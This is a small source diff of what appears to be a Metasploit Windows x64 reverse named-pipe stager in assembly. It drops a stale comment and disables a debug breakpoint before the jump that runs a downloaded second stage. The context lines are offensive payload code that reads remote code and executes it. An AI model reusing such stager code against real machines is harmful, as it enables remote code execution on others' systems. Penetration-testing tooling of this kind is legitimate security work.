@@ -127,7 +127,6 @@ module Payload::Windows::ReverseNamedPipe_x64
       get_pipe_name:
         pop rcx                 ; lpFileName
       ; Start by setting up the call to CreateFile
-      ; perform the call to WSASocketA...
         push 0                  ; alignment
         push 0                  ; hTemplateFile
         push 0                  ; dwFlagsAndAttributes
@@ -265,7 +264,7 @@ module Payload::Windows::ReverseNamedPipe_x64
         sub rsi, rax            ; length -= bytes_received
         test rsi, rsi           ; test length
         jnz read_more           ; continue if we have more to read
-        int 3
+        ;int 3
         jmp r15                 ; return into the second stage
     ^
 
